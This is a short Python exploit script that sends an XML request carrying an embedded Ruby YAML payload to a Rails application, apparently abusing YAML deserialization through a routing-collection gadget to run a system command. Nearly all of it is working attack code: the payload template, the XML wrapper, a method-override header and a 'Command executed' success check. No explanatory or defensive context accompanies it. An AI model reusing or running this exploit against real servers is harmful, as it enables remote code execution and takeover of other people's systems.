import requests
import html

url = ""
payload = "system('command_here')"

yaml = f'''
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? |
  foo
  ({payload}; @executed = true) unless @executed
  __END__
: !ruby/struct
  defaults:
    :action: create
    :controller: foos
  required_parts: []
  requirements:
    :action: create
    :controller: foos
  segment_keys:
    - :format</exploit>
'''

xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">{html.escape(yaml)}</exploit>
'''

headers = {'Content-Type': 'text/xml', 'X-HTTP-Method-Override': 'get'}

resp = requests.post(url, data=xml, headers=headers)
print("Command executed !" if resp.status_code == 200 else f'Oops ! error code: {resp.status_code}')
